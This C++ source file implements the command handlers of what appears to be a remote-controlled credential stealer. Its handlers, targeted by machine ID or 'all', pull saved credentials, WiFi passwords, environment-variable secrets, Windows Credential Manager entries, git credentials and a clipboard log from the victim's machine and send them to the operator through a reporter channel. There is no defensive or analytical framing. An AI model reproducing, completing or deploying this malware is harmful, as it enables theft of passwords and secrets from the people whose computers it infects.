#include "application/commands/CredentialHandler.hpp"

#include <algorithm>
#include <sstream>

#include "domain/common/CredentialExfil.hpp"
#include "infrastructure/keyboard/ClipboardMonitor.hpp"

namespace nuub::application::commands {

CredentialHandler::CredentialHandler(interfaces::IReporter& reporter, std::string pc_id)
    : reporter_(reporter)
    , pc_id_(std::move(pc_id)) {}

bool CredentialHandler::matches(const std::string& target) const {
    std::string lower = target;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    std::string lower_pc = pc_id_;
    std::transform(lower_pc.begin(), lower_pc.end(), lower_pc.begin(), ::tolower);
    return lower == lower_pc || lower == "all";
}

domain::Result<void> CredentialHandler::handle_creds(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    reporter_.send_message("Extrayendo credenciales...");

    auto creds = domain::CredentialExfil::extract_all();

    if (creds.empty()) {
        reporter_.send_message("No se encontraron credenciales guardadas.");
        return domain::Result<void>::success();
    }

    // Send as file for large results
    std::string report = domain::CredentialExfil::format_credentials(creds);
    std::string path = "credenciales_" + pc_id_ + ".txt";

    std::ofstream ofs(path);
    if (ofs.is_open()) {
        ofs << report;
        ofs.close();
        reporter_.send_file(path, "Credenciales extraidas: " + std::to_string(creds.size()));
        std::remove(path.c_str());
    } else {
        // Send as message if file creation fails
        if (report.size() > 4000) {
            report.resize(4000);
            report += "\n... [truncated]";
        }
        reporter_.send_message(report);
    }

    return domain::Result<void>::success();
}

domain::Result<void> CredentialHandler::handle_wifi_creds(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    reporter_.send_message("Extrayendo contraseñas WiFi...");

    auto creds = domain::CredentialExfil::extract_wifi_passwords();

    if (creds.empty()) {
        reporter_.send_message("No se encontraron redes WiFi guardadas.");
        return domain::Result<void>::success();
    }

    std::string report = "=== WiFi Passwords ===\n\n";
    for (const auto& c : creds) {
        report += "Red: " + c.target + "\n";
        report += "Pass: " + c.password + "\n\n";
    }

    if (report.size() > 4000) {
        report.resize(4000);
        report += "\n... [truncated]";
    }

    reporter_.send_message(report);
    return domain::Result<void>::success();
}

domain::Result<void> CredentialHandler::handle_env_creds(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    reporter_.send_message("Extrayendo credenciales de variables de entorno...");

    auto creds = domain::CredentialExfil::extract_env_credentials();

    if (creds.empty()) {
        reporter_.send_message("No se encontraron credenciales en variables de entorno.");
        return domain::Result<void>::success();
    }

    std::string report = "=== Environment Credentials ===\n\n";
    for (const auto& c : creds) {
        report += c.target + " = " + c.password.substr(0, 8) + "...\n";
    }

    reporter_.send_message(report);
    return domain::Result<void>::success();
}

domain::Result<void> CredentialHandler::handle_win_creds(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    reporter_.send_message("Extrayendo credenciales de Windows Credential Manager...");

    auto creds = domain::CredentialExfil::extract_windows_credentials();

    if (creds.empty()) {
        reporter_.send_message("No se encontraron credenciales en Windows Credential Manager.");
        return domain::Result<void>::success();
    }

    std::string report = "=== Windows Credentials ===\n\n";
    for (const auto& c : creds) {
        report += "Target: " + c.target + "\n";
        report += "User: " + c.username + "\n";
        report += "Pass: " + c.password.substr(0, 8) + "...\n\n";
    }

    if (report.size() > 4000) {
        report.resize(4000);
        report += "\n... [truncated]";
    }

    reporter_.send_message(report);
    return domain::Result<void>::success();
}

domain::Result<void> CredentialHandler::handle_git_creds(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    reporter_.send_message("Extrayendo credenciales de git...");

    auto creds = domain::CredentialExfil::extract_git_credentials();

    if (creds.empty()) {
        reporter_.send_message("No se encontraron credenciales de git.");
        return domain::Result<void>::success();
    }

    std::string report = "=== Git Credentials ===\n\n";
    for (const auto& c : creds) {
        report += "Source: " + c.source + "\n";
        report += "Data: " + c.password + "\n\n";
    }

    reporter_.send_message(report);
    return domain::Result<void>::success();
}

domain::Result<void> CredentialHandler::handle_cliplog(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    if (!clipboard_monitor_) {
        reporter_.send_message("Monitor de portapapeles no disponible.");
        return domain::Result<void>::success();
    }

    auto* monitor = static_cast<infrastructure::keyboard::ClipboardMonitor*>(clipboard_monitor_);
    std::string log = monitor->get_log_text();

    if (log.empty()) {
        reporter_.send_message("No hay cambios de portapapeles registrados.");
        return domain::Result<void>::success();
    }

    if (log.size() > 4000) {
        log.resize(4000);
        log += "\n... [truncated]";
    }

    reporter_.send_message("=== Clipboard Log ===\n" + log);
    return domain::Result<void>::success();
}

domain::Result<void> CredentialHandler::handle_clipclear(const std::string& target) {
    if (!matches(target)) return domain::Result<void>::success();

    if (clipboard_monitor_) {
        auto* monitor = static_cast<infrastructure::keyboard::ClipboardMonitor*>(clipboard_monitor_);
        monitor->clear_log();
    }

    reporter_.send_message("Clipboard log limpiado.");
    return domain::Result<void>::success();
}

} // namespace nuub::application::commands
